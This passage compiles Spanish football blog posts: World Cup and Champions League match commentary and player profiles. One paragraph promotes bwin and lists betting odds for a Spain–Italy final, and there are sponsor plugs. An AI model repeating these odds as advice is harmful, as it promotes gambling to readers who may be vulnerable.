lo que se escape de ahí, todo lo que pierda la perspectiva del fenómeno ordinario, termina anclándose en las aguas pálidas de lo inane. Ni los datos, ni los sesgos sociales, ni las desdichas íntimas pueden hacer olvidar que el fútbol es un deporte de la colectividad para la colectividad y en eso reside su encanto, en la calle y en su idioma global.No pretendo criticar los pasos adelante, pero me siento tan lejos de la morralla editorial de los periódicos mayoritarios como de la artificiosidad y wikipedismo de muchas publicaciones minoritarias actuales. La calidad es la vara de medir, la emoción si se permite. No basta con hablar de un equipo humilde de Malawi sino lograr hacernos parte de sus vivencias. La calidad no está en el tema sino en el enfoque, en la capacidad humana para mostrarnos una realidad que no es la nuestra. Y eso no lo da Larousse ni lo da la hemeroteca, eso sólo se consigue desde la honestidad, nunca a través del oportunismo o la moda. No es sólo lo que se escribe, también lo que se comenta, el cómo se vive.Todo un éxito.Lo peor: jugaron un fútbol muy tosco, quizá el único al alcance de la calidad técnica del equipo, y puede ser que ante Paraguay les faltase un punto de ambición.La estrella: Shane Smeltz dejó algunos detalles de calidad en la punta de ataque.El momento: el tanto frente a Italia, que provocó que los ojos del mundo se volvieran asombrados hacia el césped del Peter Mokaba Stadium.Italia. Eliminada en la primera fase. Dos empates y una derrota, cuatro goles marcados y cinco recibidos. Goleadores: De Rossi, Iaquinta, Di Natale y Quagliarella.Lo mejor: que a pesar de los pesares, pareció hasta el último momento de la agonía que lograrían el gol salvador; ese recio espíritu competitivo que distingue a los azzurri.Lo peor: quizá jugador por jugador es la peor selección que nunca haya llevado Italia a un mundial. Se tenga el plan que se tenga, la mezcla de mediocridad y veteranía excesiva es un lastre excesivo para cualquiera.La estrella: apurando mucho, nos podemos quedar con el trabajo en el primer partido de Simone Pepe.El momento: el maravilloso gol de Quagliarella que cerró la participación de Italia en este mundial, enorme paradoja de una de las selecciones que menos ofreció. Neymagia. Llevaba tiempo ya sonando como el runrún, que si es muy bueno pero no marca, que si regatea pero no define, que si marea la perdiz pero no nos la comemos. Ayer el artista brasileiro agarró por las solapas el tipo de partido que sólo mira quien le toca de cerca, le dio varias veces la vuelta y obligó a que los focos de la jornada convergieran, una y otra vez, sobre sus filigranas en el Camp Nou. Asistencias, quiebros, fantasía y un hat-trick para probar que nadie tiró el dinero con él –como mucho algo se perdió por el camino-, que se pueden ganar holgadamente partidos de Champions sin Messi, y que también acabará firmando su cuota de goles, aunque no le debamos pedir lo mismo que a Bale, porque son jugadores distintos. Entre chicharro y chicharro, una mirada apenada para comprobar en qué se ha convertido el Celtic. Hubo una era en que esa banda fue campeón de Europa.Una decisión difícil. Si a los entrenadores de élite les pagan los millones que les pagan es en parte porque, en algunos o muchos momentos de sus carreras, tienen que tomar decisiones en un marco de absoluta incertidumbre. Algo así le ocurrió ayer al amigo Rafa Benítez, que por demás está haciendo un trabajo intachable en Nápoles. Según su costumbre en partidos de élite, planteó un duelo cerrado frente al poderoso Arsenal, en un contexto en que una victoria le daba la clasificación si el Dortmund no ganaba en Marsella. A falta de 17 minutos marcaba Higuaín – a quien no le ha pesado la zamarra azul en Liga de Campeones- y el resultado en el Velodrome era de 1-1, con gran presión del Borussia. Dos minutos después, echaban a Arteta y se presentaba la dicotomía: ¿lanzar al equipo al ataque frente a un Arsenal roto para marcar los dos goles necesarios en caso de victoria alemana, o aguantar confiando en el Olympique? Fue lo segundo, y el desenlace fue duro: gol de Grosskreutz y vaselina de Callejón en el descuento sin tiempo para más. Decisión conservadora, como casi siempre en la carrera de Rafa, y derrota. Pero no era fácil, nada fácil.Palos redondos. La historia negra del Barcelona, que comenzó a borrar Cruyff y estos días se contempla poco más que como una lejana pesadilla, tocó techo en la noche terrible de Berna. Era la primera final de Copa de Europa que disputaba el club azulgrana, y nada menos que cinco palos (cuadrados en aquella final) tuvieron mucho que ver en el 2-3 final frente al Benfica. Una cuenta pendiente que ayer le cobró la suerte al fútbol portugués, en forma de cuatro postes que escupieron hacia fuera los disparos del Oporto en el Manzanares. Un partido de los que demuestran qué es un equipo con estrella y un equipo estrellado, especialmente cuando el fenomenal zambombazo de Raúl García Nedved también tocó madera pero se fue para dentro. Hay días que uno no está para nada, o lo que es peor, está para la Europa League.Monumento a la decadencia. Sobre el papel, once copas de Europa se desplegaban ayer sobre el césped de San Siro para dirimir uno de los duelos más clásicos de la competición. Al final, clasificación del Milan y una sensación de desolación absoluta al comprobar en qué se han convertido estos dos antiguos colosos. Por un lado los rossoneri, con Balotelli rodeado de jubilados y mediocres, penalizados por una estupidez de Montolivo y consagrados durante el partido completo al catenaccio más recalcitrante; por otro el Ajax, constante en su propuesta tradicional, pero romo e incapaz de hacerle un gol a un equipo débil e inferior que no le amenazó en ningún momento. Al fondo, un fútbol que cambia probablemente a peor, y que deja en la cuneta a algunos que en su día fueron grandes y hoy se han quedado en venerables.PD: Si tras un sorteo dirigido este Nápoles se queda fuera de octavos con doce puntos y este Zenit entra con seis, algo no va. Mediterráneo. Anoche azotaba la ventisca el castillo de If. Al menos, esa fue la excusa que una taquillera pelirroja y sonriente lanzó al arriba firmante para justificar que los barcos que realizan habitualmente el trayecto hacia la antigua prisión permanecerían esa tarde anclados en el muelle. La decepción es grande para quien ha crecido con el Montecristo en su cabecera, y así debió de percibirlo la muchacha, que no encontró mejor consuelo que preguntar por la nacionalidad del visitante. “Espagnol? Bonne chance demain!!! “. El oyente se quedó pensando que generaciones de españoles no han podido disfrutar de un extraño que les desee buena suerte para una final internacional, y que nosotros llevamos tres en cuatro años. Tan gigantesco y grandioso que cuesta percibirlo desde dentro.Cobijando a Zodiac. Te preguntan: “suponga hipotéticamente que su hijo es un asesino en serie, y que, perseguido con saña y denuedo por la policía, acude a usted como última esperanza para que lo oculte. ¿Lo entregaría?” La respuesta dependerá de la relación que tenga cada uno con sus hijos, pero ese mundo de ahí fuera está repleto de Madres Coraje que siempre encontrarían mil excusas para encubrir el único motivo, ese sentimiento familiar, incontestable y, en ocasiones, aterrador, que sobrevuela entre carcajadas las explicaciones racionales para luego cagarse en ellas: el amor. Así será el sentimiento de muchos de los que hoy nos sentaremos delante de la tele, vestidos de rojo y comiéndonos las uñas. Cuánto queremos a este equipo que nos hizo tan felices, asesino en serie -en este torneo- del fútbol que más nos gusta. Tiquinaccio a mano armada.Talismanes. Prepárenlo todo, saquen las fotos de hace cuatro o dos años, revisen y repitan indumentaria, comida, compañía. Si estaban solteros dejen a su mujer por un día, si fumaban pero lo dejaron échense un pitillo, no morirán por ello. Y si el primer penalty que meta España los coge con las manos en los bolsillos, déjenlas ahí, no cambien con lo bueno, la vuelta a la silla ylos  saleros fuera si la cosa se tuerce. En cualquier caso improvisen, sufran, crean que cualquier cosa puede influir, en esa parte infinitesimal de la suerte que de todos modos no depende de nosotros, y que sin embargo puede que, a base de fe, un poquito sí. Piensen que los italianos llevan partido tras partido peregrinando al Monasterio, y que algo habrá que hacer. Le debemos mucho a la suerte estos días.Cada semana, y de la mano de bwin, os ofreceremos los partidos más interesantes del fútbol mundial, con especial atención a todos aquellos que os manejáis en el mundo de las apuestas on-line. Los Fratelli. “Por lo menos juega”, le dijo San Pedro a aquel tipo que venía cada vez a suplicarle por el premio de la lotería, y algo así debió de pensar Cesare Prandelli, el promotor de las caminatas nocturnas. El tipo del aire a Bill Murray abrió las ventanas para que saliera el tufo a carcoma, llenó la defensa de chavales, la delantera de chalados y el medio de futbolistas, y aterrizó en el Este mientras en Italia descargaba la tormenta. Ganará o perderá, pero antes de que ruede el balón hay varias cosas que ya nadie podrá quitarle: haber sido superior a Inglaterra y Alemania, el cariño de los neutrales por su modo de encarar los partidos e interpretar el deporte, y el carácter de haber sido la única selección que no ha salido ante España como si fuese a ver El resplandor. Todo esto sin hablar de Pirlo, claro.Al final todo da igual.Útil para abastecer a la vanguardia y esencial varios metros por detrás ahora que Gatusso está lejos de su versión óptima, en ambas funciones su juego es delicioso. Sin complicaciones, con la rapidez mental que otorgan los años en el oficio y con el mismo pie de seda acostumbrado, Seedorf se hincha en cada partido a servir balones útiles. Como Mauro Silva o Redondo, transmite la sensación de que podría jugar en esta posición durante diez años más si se lo propusiera. Y en elló está, el que otrora apuntó a figura intrascendente, un recorte aquí, un pase académico allá, acercándose a los 300 partidos con el Milan. A la leyenda. Una mañana rastreando infrafútbol en la hemeroteca de El Mundo Deportivo apareció Quinito. Decían que aquel barbas había sido ídolo en el Racing de Santander setentero, pero de todo el artículo solo entendí una frase. “Mi adaptación fue difícil. Cuando llegué a Santander el único que bebía y fumaba era yo”, explicaba, bordando esa especialidad del profesional extranjero que es rajar del antiguo club en los medios locales en cuanto se largan. Creo recordar que en ese momento sonaron trinos y el pdf de la pantalla escupió una luz celestial pero ningún angelito. George Best jugaba en El Sardinero, punto. No necesité conocer mucho más para admirar a aquel tipo.Joaquim Lucas Duro de Jesus es un cromo mítico del fútbol portugués. Fue de los mejores en el campo, vividor desde que el árbitro silbaba tres veces para enfilar la ducha y una referencia en los banquillos portugueses. En Santander recuerdan su magnetismo barbudo en calzones y en todo Portugal su magisterio en la caseta. Barba desaliñada, chubasquero y tabaco. “Quinito fue un marciano en una ciudad de provincias en los 70. Porque opinó de política, porque denunció la corrupción que rodeaba al fútbol y porque vivió en Santander con la misma naturalidad con la que jugó. Fue nuestro Curro Romero, al que se le perdonaron tantos partidos desaparecido porque la afición sabía que su mejor regate estaba por llegar”, explica Fernando González-Riancho, responsable del proyecto ‘Racinguismo Ilustrado’ Le preguntamos porque hoy hemos vuelto a saber de Quinito.No es el cromo carismático que fue o mejor dicho, lo sigue siendo a su manera. Hace 15 años que no entrena y se le murió un hijo en 2009. Desde entonces habla poco, pero los 67 años y mientras recibía el homenaje de los entrenadores portugueses por una vida en chandal, ha roto su silencio. Para ajustar cuentas con el fútbol y consigo mismo, para romperse en público. Rescatamos el discurso de Quinito por emocionante y como testimonio de la vida en carretera para cualquiera que no sea Cristiano Ronaldo. Como ejemplo del fútbol que cuenta. “No vi a mi hijo decir papá por primera vez, no vi a mi hijo aprender a nadar, no vi a mi hijo aprender a andar en bicicleta, no lo abrazaba todos los días, pasaban meses en los que no lo abrazaba y ahora no está aquí. Es difícil tener un hijo y no conocerlo. La culpa es del fútbol. Siento un divorcio, siento una cierta culpa por haber cambiado el fútbol por conocer a mi hijo. No esperaba un homenaje así y me va a dar fuerza para intentar fuera la culpa que tengo dentro. Tuve un hijo maravilloso que, en realidad, no conocí. El fútbol me salió caro. Estoy intentando con todas mis fuerzas salir de esta situación, limpiar el sentimiento de culpa y chutar el balón hacia delante. A estas alturas estoy perdiendo por 50-0. De nada me va a valer lo que gané, empaté y perdí, pero voy a intentar dejar esa situación de 50-0 y llegar al tiempo de descuento o a los penaltis. Vamos a ver” Había ganas de ver el arranque del Madrid. Primero para comprobar que el Bernabéu seguía en su sitio. Si la televisión me iba a devolver la imagen de un erial calcinado por las llamas con la M mourinhista intacta en el centro (?) o algún socavón abisal en mitad de La Castellana. Algo funesto en definitiva, pero no. Afortunadamente (mejor no mutilar todavía más la Liga de dos) el dinosaurio sigue intacto excepto por lo de Casillas, que puede traer cola. También me inquietaba comprobar si la pretemporada ultraplácida había sucedido realmente o había sido una proyección malvada que nos estaba inyectando Florentino en el cerebro (a lo Inception pero a través de los altavoces habituales) para resetar a lo bestia el despropósito del año anterior. Pero tampoco, el asunto debe ir en serio porque el Madrid se mostró contra el Betis tan incompleto como cabe esperarse de un equipo en formación.Vencieron (2-1) a unos verdiblancos notables, eso sí, pero con más sudores de los esperados. Pero lo hicieron pariendo algunas noticias que los suyos deben celebrar. La primera, obvia, fue el resultado. Segunda y tercera, el partidazo de Isco y el asomarse otra vez de Marcelo.Digo noticias para los madridistas porque la potente la fabricó el Betis de Pepe Mel. Los sevillanos ya eran uno de los equipos con más personalidad de España la pasada temporada y vuelto al tajo como un cohete. Dejando el partido empatado en el Bernabéu hasta el minuto 85, tirando de defensa adelantada en un arranque delicioso, buscando la combinación de cerebro y vértigo… Una muy buena presentación.Puedes comprar camisetas del Ebbsfleet United, y de cientos de equipos más, en Classic Football Shirts, la tienda online especializada en camisetas de fútbol oficiales de todo el mundo. ‘Dani Parejo es una pieza básica de lo que pretendemos de nuestro equipo. Si no flaquea, seguiré contando con él, porque queda muy poquito‘. Juan Antonio Pizzi, obligado a cuidar al detalle la dosificación de sus futbolistas en esta recta final de la temporada, tiene muy presente de quién depende en mayor medida el juego de su equipo. Insustituible en el centro del campo del Valencia, Parejo ha encontrado en el proyecto de Pizzi el acomodo que se le negó con Djukic, Valverde, Pellegrino o Emery. Cuatro técnicos para los que el madrileño siempre fue un sí pero no, un futbolista al que le pesaban más sus carencias que sus virtudes. Un buen complemento puntual, nunca una piedra angular. Banega, Canales y Parejo. He de admitir que el excanterano madridista era, de la terna de centrocampistas creativos que hasta hace bien poco lucía el Valencia CF en su plantilla, el futbolista que menos me convencía. Siempre me pareció un jugador insípido, con una preocupante tendencia a disiparse y camuflarse en lugar de sobresalir y acaparar protagonismo y unas lagunas defensivas imperdonables en un jugador del más alto nivel. Como si un carácter tímido lastrara y condicionara su juego, Parejo siempre terminó sucumbiendo a los muchos malos momentos que se intercalaban entre los pocos buenos. Digirió mal la competencia que le plantearon sus técnicos en Mestalla como herramienta de motivación. En lugar de crecerse y tirar de orgullo ante esos toques de atención, el centrocampista de Coslada se hundía bajo el peso de la responsabilidad cada vez que los elegidos eran Banega o, en menor medida, Canales. La medida no funcionaba.Coincidiendo con la salida de Banega y Canales de Mestalla, a Parejo le llegó la hora de tomar el mando. Libre de seria competencia en su puesto sobre el césped, decidió por fin dar ese paso al frente que la afición valencianista llevaba tres años esperando, precisamente cuando más falta hacía. Soy el primer sorprendido con el cambio de juego y, sobre todo, de actitud de Dani Parejo. Había perdido toda esperanza sobre el que en su día fue elogiado por Alfredo Di Stéfano como ‘el mejor futbolista de la cantera del Real Madrid’. Pensé que acabaría cediendo ante los innumerables altibajos que su carrera como jugador del Valencia había deparado y que terminaría con la paciencia de la grada y del club y acabaría haciendo las maletas con más pena que gloria. Sin embargo, la progresión exhibida durante los meses de Valverde en Mestalla, interrumpida después durante la era Djukic, vuelve a tener continuidad con Pizzi en el banquillo. Parejo no es importante, es clave, primordial y angular en el juego de este Valencia y en su proyecto de futuro inmediato. A lo mejor era precisamente lo que él necesitaba. Saberse y sentirse, por fin intocable. ‘Mikel Rico con tatuajes, pendientes y tontería sería una estrella‘. Vale, nos confirman desde Granada que el centrocampista vizcaíno en realidad sí que tiene su piel tatuada. Algo en un costado del cuerpo, bien oculto bajo la camiseta, para su ‘disfrute’ en la intimidad del hogar. Pero la frase de José Luis Hurtado, del diario Marca, no pierde ni un mínimo de significado. Mikel Rico (Arrigorriaga, 1984) es un hombre discreto, sin estridencias, sin ‘tontería’, como decía Hurtado tras su exhibición en el partido de vuelta de los octavos de final de la Copa del Rey ante el Betis. Ninguna de estas condiciones, sin embargo, le impiden ser un futbolista excepcional.Rico llegó el pasado verano a Bilbao sin el ruido de otras incorporaciones del Athletic. Pese a haber sido solicitado por Bielsa, su fichaje no se confirmó hasta la salida del argentino del banquillo rojiblanco. Hubo quien calificó su contratación como de innecesaria y caprichosa. Un futbolista de perfil bajo, que venía de hacer carrera en el modesto Granada y en diversos equipos de tercera fila, con sus veintiocho añitos ya cumplidos, jugando en una posición teóricamente bien cubierta… No era la incorporación más ilusionante posible, a la sombra de las llegadas de Kike Sola y, sobre todo, el exbético Beñat.Al paso firme del Athletic en el torneo liguero Mikel Rico acabó convirtiéndose en imprescindible. Su fichaje, de repente, comenzó a ilusionar a San Mamés. Su sociedad en la medular con Ander Iturraspe, otro futbolista que ha crecido varios peldaños en los últimos meses hasta hacerse insustituible para Valverde, es el sustrato donde germina el buen fútbol de los leones.El ’17’ rojiblanco no ciñe su trabajo al achique, a la presión y al derroche físico sobre el césped. Ha redimensionado sus prestaciones y se ha destapado como un potente llegador. El propio futbolista admitía tras sus dos goles de ayer (y el del pasado sábado ante el Almería) que la irrupción de la segunda línea en el área rival es una jugada que han ensayado con frecuencia en los entrenamientos. Gracias a ella ha anotado ya siete goles con la camiseta bilbaína, siete clavos en el ataúd futbolístico del casi inédito Beñat. Los mismos tantos que en las tres temporadas que vistió la camiseta del Granada. Es tal vez el futbolista más en forma del actual Athletic, se ha ganado el favor de San Mamés y se ha convertido, cinco meses después, en una incorporación realmente ilusionante. Sigue, eso sí, sin enseñarnos los tatuajes. Siempre fiel a su discreción. La noche en la que la madre de todas las competiciones futbolísticas volvía a escena, la noche en la que Real Madrid, Sevilla FC y Atlético de Madrid despachaban sus respectivos compromisos de debut con una solvencia envidiable, la noche en la que el Manchester City prolongaba su maldición europea y el United tropezaba en Eindhoven en el que era su retorno al lugar de donde nunca debió salir fue, sobre todo, la noche del debate en torno a la cobertura televisiva del torneo. Porque a pesar de que el partido del Bernabéu, teórico plato fuerte de esta jornada inaugural, era ofrecido en abierto a través de Atresmedia (Antena 3), cientos de miles de espectadores colapsaron con sus infructuosos intentos de conexión el servidor de Total Channel, la plataforma televisiva online que se había ofrecido como alternativa a Orange, Vodafone y Telecable para distribuir a través de Internet la señal de BeIN Sports, canal propietario de los derechos de emisión en España del resto de partidos de la jornada.Y llegados a este punto ya ni siquiera sorprende que un fallo técnico dejará colgados a tantos y tantos aficionados de toda España.Recordamos la infausta experiencia vivida hace unos meses con la retransmisión para España del Mayweather-Pacquiao y todo parece más normal. Lo más llamativo es poder comprobar como un producto de sencilla y asegurada venta y altísima demanda ha sido tan severamente maltratado por los propietarios de sus derechos de emisión en España. Porque uno podría incluso plantearse cómo es posible que alguien que no tiene la capacidad ni los medios oportunos y necesarios para distribuir la señal del torneo a todos y cada uno de los hogares y establecimientos públicos del país decida realizar una inversión económica tan magnífica para hacerse con el tesoro. Suena a perro del hortelano. Me lo quedo yo para que no te lo quedes tú. Lo mínimo que se espera, tratándose del torneo europeo por excelencia y del mayor escaparate futbolístico del planeta, es que cualquier aficionado de cualquier rincón de nuestra geografía, por remoto que sea, pueda disfrutar del espectáculo. De que se pueda garantizar el acceso al producto, aun en las condiciones económicas que se establezcan. Nadie habla siquiera de no pagar, de piratear canales o de engancharse a enlaces clandestinos, no. Hablamos del simple derecho a poder disfrutarlo. Del derecho a pagar por ello y poder sentarte cómodamente en el sofá de tu casa. Supongo que la liberalización del mercado de las telecomunicaciones y el maltrato y abandono del llamado ‘servicio universal’ son dos explicaciones plausibles en cuanto a lo técnico, pero inadmisibles en cuanto a la lógica.Actualización: Jaume Roures, en entrevista concedida a Radio Marca, justifica la caída del servicio de Total Channel durante la noche de la jornada inaugural de la Champions League con el aluvión de usuarios ‘conectándose a la plataforma justo cinco minutos antes del arranque de los partidos‘. Capacidad de autocrítica. Nadie se esperaba algo así. Porque nadie en su sano juicio podía esperar que la actual campeona del mundo y de Europa arrancase su defensa del título mundialista sufriendo la derrota más abultada encajada por un campeón en un Mundial. Nadie podía llegar a hacerse a la idea de encontrarse, de entrada, a un campeón tan empequeñecido, tan carente de personalidad y orgullo, tan expuesto a ese daño que cualquier equipo del mundo quiere infligir al teórico dominador. Y nadie esperaba algo así porque nadie preveía una Holanda tan exuberante, tan copiosa, tan plena de confianza, tan vangaalizada. Tan capaz de humillar a España, en suma.El combinado de Vicente del Bosque naufragó en un escenario imprevisto. Y lo hizo porque, al primer meneo, se vino abajo con un estrépito incomprensible e impropio de un equipo de su caché y su bagaje.De repente, surgieron las memorias de Chipre, de Irlanda del Norte y de horrores similares. No es sencillo explicar el porqué de un desmoronamiento tal, de un equipo tan irreconocible en todas y cada una de sus piezas, tan superado a todos los niveles. Cuesta entender por qué los nuestros no fueron capaces de frenar la sangría, de guarecerse de cualquier manera con tal de evitar la abultada diferencia de goles (¿a alguien se le olvidó el pequeño detalle del gola-average?) . La imagen de una España zarandeada y dudando entre si cubrirse el mentón o protegerse el hígado ante los implacables envites de Robben y van Persie no causaba indignación. Ni siquiera bochorno. Causaba lástima. Lastima ante la descomposición y la podredumbre de la gran obra. Lo mejor de todo, lo único bueno realmente, que después de esto ya es imposible ir a peor. A partir de este sonrojante 1-5 solo se puede crecer.Pero lo que más me duele de todo este bochornoso arranque es la reaparición de la España cainita. La vuelta a escena de todos esos justicieros con el cuchillo de pelar fruta entre los dientes, dispuestos a poner las cosas sobre su sitio, a advertir sobre lo que ‘ellos ya dijeron’, como si todos los demás fuésemos unos pobres idiotas carentes de capacidad de análisis. Como si tuviesen una carpeta de facturas pendientes de cobro y con fecha de vencimiento coincidente con el ciclo del combinado español.La foto de Casillas es la última pelota del partido de tenis. El deporte de la raqueta, que desde el reglamento manifiesta intención de infinitud, se caracteriza por que en él basta ganar la última pelota. Da igual haber sido mucho peor, compensar mezquinamente dos tiebreaks favorables con dos roscos ingeridos sin cuartel, haberse aprovechado de las interrupciones, la lluvia y la miopía del juez de pista, que es la postrera la que tiene que entrar. La del telediario. No queremos otra cosa, una instantánea con la cara del santo, el brillo arriba y la alegría alrededor, corroborando que somos los campeones. Todos nosotros. Bastará eso para ser felices, o muy felices, o terriblemente felices. ¿Qué más queremos?Desde el punto de vista de las apuestas, se presenta un partido bastante igualado. En bwin la victoria de España se paga a 2.20, el empate a 3.20 y la victoria transalpina (quizá el valor más interesante) a 3.40. Si España lleva el partido a pocos goles, como ha ocurrido durante gran parte de la Euro, hay que saber que el 0-0 se paga a 6.25, el 1-0 a 5.50 y el 0-1 a 7.00. Asimismo, que no haya goles en el primer tiempo se paga igualmente a 6.25. En cuanto a goleadores, hay que destacar que tanto Fábregas como Balotelli se pagan a 3.25, que sube a 8.00 en el caso del primer gol.Finalmente, es remarcable que cualquier apuesta porque uno concreto de los dos equipos gane en prórroga o penaltis se paga a más de 10. Suculento. Hoy que vuelve Uruguay a las semifinales del mundial cuarenta años después, es justo y necesario recordar su gran hazaña, la mayor sorpresa de la historia del fútbol. A la final de 1950 en el flamante Maracaná asistieron más de doscientas mil personas –algo jamás visto- para contar cuántos goles recibían los charrúas de una selección brasileña que había anotado 21 en cinco partidos y a la que, cosas de ese torneo, le bastaba el empate para ser campeona. Aunque el choque salió parejo y hasta el segundo tiempo no tomó el rumbo prefijado con el gol de Friaça, nadie creía en la posible remontada que hicieron posible los goles de Schiaffino y Gigghia. Bueno, nadie no; los charrúas sí creyeron, y muy especialmente su capitán Obdulio Varela, el hombre que con su poderío, empate y liderazgo cambió el aire del partido. Habrá habido mejores jugadores, pero quizá nadie se acerque a la categoría de leyenda como el Negro, el hombre del Maracanazo. Resulta casi pornográfico recordarlo en estos tiempos tristes en que el ruido se impone a la noticia y lo lateral a lo esencial, pero esta tarde comienzan los cuartos de final de la Copa de Europa y, con ellos, la recta final decisiva de esta temporada. Ni las pataletas pueriles e incomprensibles de un Madrid demasiado confuso en lo institucional ni la reacción ombliguista e hiperbólica de gran parte del periodismo deportivo –el silencio stampa puede molestar algo al público, pero ofende principalmente a aquél- ocultan del todo la visita a Chipre del equipo blanco, en un encuentro que se presume apacible. Quizá demasiado apacible.Desde el punto de vista puramente deportivo, la principal noticia será comprobar cómo afecta al Madrid la baja de su director indiscutible de juego, Xabi Alonso. Aunque de un tiempo a esta parte se viene acusando al tolosarra de un cierto descenso en su rendimiento –quizá provocado por el exceso de partidos-, para calibrar su importancia en el actual mecano de Mourinho sólo hay que repasar brevemente las reacciones de la afición madridista a raíz de su sanción, que oscilaban antes del sorteo entre la aprensión y el pánico, y que tras él se acercan mucho al alivio.Matilla sosteniendo el invento en el centro y con Verdú clarividente a la espalda de unos centrocampistas blancos incapaces de cerrar la puerta. Con la velocidad de Cedrick y la inteligencia para los movimientos de Nosa. Qué se lo digan a Carvajal… Arrancó mandando con el gol de Jorge Molina y pese al empate de Benzema firmaron una primera parte sobresaliente. Sigue la feria en el Villamarín.Contra pronóstico, este Madrid que Ancelotti cincela para ser un equipo coherente en la construcción solo pudo imponerse por la archiconocida vía del desmelene. No llevamos ni un partido y el Madrid ya ha desempolvado la corneta. Crecieron los blancos en el tramo final del encuentro, espoleados por las presencias y las ausencias. Isco estaba tanto que se dio el lujo de resolver de cabeza un partido envenenado; Khedira se fue sustituido y el Madrid resucitó al instante. A Casemiro la sobraron los pocos minutos de los que dispuso para cuadrar ese puzzle medular que tanto se la atraganta al alemán. Es cierto que el partido se le hizo eterno al rival pero no lo es menos que el Madrid firmó sus mejores minutos desde que el brasileño saltó al campo.Marcelo fue la otra clave. Encontró en la segunda mitad la alegría necesaria para peinar la banda izquierda como en los buenos tiempos (los de la dieta y los minutos) y brindarle el 2-1 a Isco con un centro precioso. El brasileño sufrió al comienzo pero acabó el partido disfrutando en ese cuadradito entre la banda y la frontal del área que no hace demasiado era pura pista de baile para su lucimiento. Todavía son brotes verdes (Benzema, Özil, la defensa, todo eso queda en el debe) pero como Marcelo, este Madrid sí parece otro.Foto: Real Madrid A vueltas con este desenlace supercopero en sesión golfa, Casillas como todos fumando en pipa, la huelga de astros y el compromiso Champions del Villarreal, lo que les quiero contar les importará entre poco y nada pero como en DDF, en especial el que firma, somos cabezones y tenemos una manía recalcitrante por acordarnos de las cosas no me resistiré. Alla voy, tal día como hoy pero en 1996 David Beckham nacía para el mundo con un golazo al Wimbledon desde el centro del campo. La lista de éxitos la rompía Babylon Zoo, los aficionados a la basura pop los recordarán, con una canción titulada Spacemen, la banda sonora justa para un gol de otro planeta.Paren la película. La pelota le llega a un rubito en mitad de Selhurst Park, el Wimbledon compartía “piso” entonces con el Crystal Palace porque el infame Plough Lane no pasó las severas revisiones de seguridad que regían en la isla tras la desgracia de Hillsborough. La redonda bota delante de un cromo cualquiera, David Beckham llevaba tan solo 42 partidos de liga a las espaldas, incluida una cesión al Preston, y aun despachando una regularidad y brillo prometedor el año anterior no era, ni por asomo, el dios en la tierra en que se convirtió al poco para la mayoría de aficionados ingleses. Un balón y delante un chaval que ni siquiera había jugado con la selección, que no era aun El Póster. Y, ¡acción!Dió igual. Con la gasolina mental que le da el 0-2 arriba frente a un rival pegajoso y un raro talento para el golpeo en el bolsillo, David Beckham no piensa como los mortales. Si le zurro aquí y fallo me van a torear durante toda la semana es un concepto lejano bajo el blondo flequillo del centrocampista. Desde distancia absurda otea y le pega a puerta como los ángeles, la pelota vuela hasta la portería de Neill Sullivan con la perfección de un vídeo viral amañado y es gol. Y es un pedazo de gol y Beckham, ab-so-lu-tely brilliant se relamió el comentarista, subió como la espuma. Al mes siguiente su cara empapelaba las habitaciones de media Inglaterra. República de Corea 2-0 GreciaAlguno dirá que el primer plato en la segunda jornada de Mundial se sirvió tal y como estaba anunciado en la carta. Estoy de acuerdo sólo en parte. El espíritu de la Eurocopa ha dejado de estrechar la mano de los helenos hace mucho tiempo y el equipo más que jugar languidece sobre el rectángulo verde, añorando su compañía. Muchas dificultades para asociarse, dependencia insana del juego a balón parado que sea capaz de producir Giorgios Karagounis, un ataque inocuo… Apenas tres o cuatro chispazos iluminaron la cara del condenado que lucio Grecia durante los 90 minutos. En descargo de Otto Rehhagel y los suyos hay que reconocer que muy pocos confiaban en verles balilando la samba. Caso opuesto es el de la República de Corea. Niña bonita de los amantes de la parabólica, uno está tan habituado a que broten flores de los micrófonos y plumas cuando toca hablar del combinado oriental que, francamente, esperaba algo más. No se me malinterprete, creo que Corea del Sur es un señor equipo que aun no ha mostrado todo su talento en el Mundial. Incisiva banda derecha, solidaridad para correr a la pared, dinamismo y gol fueron sus armas. Ganaron como y cuando quisieron pero… Me ilusionarían si no fuera porque también vi falta de ambición y errores graves de concentración en defensa.Argentina 1-0 NigeriaArrancó Argentina lo suyo con empuje y pensé, el Mundial ha comenzado. Error. El cerebro me jugó una mala pasada y aisló del proceso mental dos recuerdos: que nunca he visto a la albiceleste aplastando en la Copa del Mundo y que al equipo de Maradona le falta mucha grasa en los engranajes. Pero aun con todo, el atasco de la segunda parte y la parsimonia en las transiciones principalmente, los argentinos merecieron volverse al hotel con mayor renta que un miserable 1 a 0. Fallo Higuaín, para regocijo de los olvidadizos, falló inesperadamente Lionel Messi pero por suerte apareció el Gringo Heinze, uno de esos viejos a defenestrar a los que les ha dado por destacar últimamente. Y certificó, de testa, un triunfo vital. Desde ahí, inicio puro, hasta el pitido final todo indicaba que Nigeria podía recolectar un bonito saco de goles. Todo excepto la figura de su portero, un monumental Enyeama que fue la única razón para esperanzarse con un futuro mejor. No hubo caso. Velocidad sí y algún disparo furtivo como los de Obasi y Taiwo fueron el bagaje de un equipo que debió creer más. Maradona estrenó el traje, impagable estampa, con victoria pero se guardó en el bolsillo del sin par textil el apunte de que el equipo necesita evolucionar.Inglaterra 1-1 Estados UnidosNo ha sido el debut soñado. El brutal arranque de Inglaterra, con el prematuro gol de Gerrard, no llegó a nada. EEUU se  creció, motivadísima, convenciéndonos de que aquella Copa Confederaciones no fue  un espejismo. Atenazó a los de Capello y termino empatando. Un gol que no  es un gol, que es la continuación de una maldición, la de los porteros  ingleses. El agujero negro que puede engullir al combinado entero. Un tiro manso de  Dempsey, aplatanado, lastimero, que Green es incapaz de atrapar. Peor que el  fallo de Robinson, a la altura del peor Seaman. La mirada de Capello era como la  de Cíclope en un cómic de X-Men. El uno a uno final es justo por los méritos de  ambos. Una Inglaterra disciplinada pero con poca chispa arriba –flojísimo Heskey e  inédito Rooney- y unos EEUU con más ganas que talento. Son los dos mejores del  grupo, posiblemente pasen ambos, pero un partido tan trepidante –el mejor de lo  que va de mundial- será recordado por las manos gelatinosas de Green. Hasta  James pudo hacerlo mejor. Contra todo estereotipo, una de las estampas más  impresionantes que pueda ofrecer el paisaje asturiano, es la  contemplación de la imponente central térmica de Soto de la  Barca, emergiendo tóxicamente de la nada, rampante en mitad de un entorno idílico.Esta manera de entender el fútbol como un fenómeno plástico, como si Nureyev se hubiera quitado las zapatillas para calzarse unas botas de tacos. Como si Guardiola, Sacchi, Mourinho y Cruyff no pudieran compartir el mismo espacio sobre la tierra o en 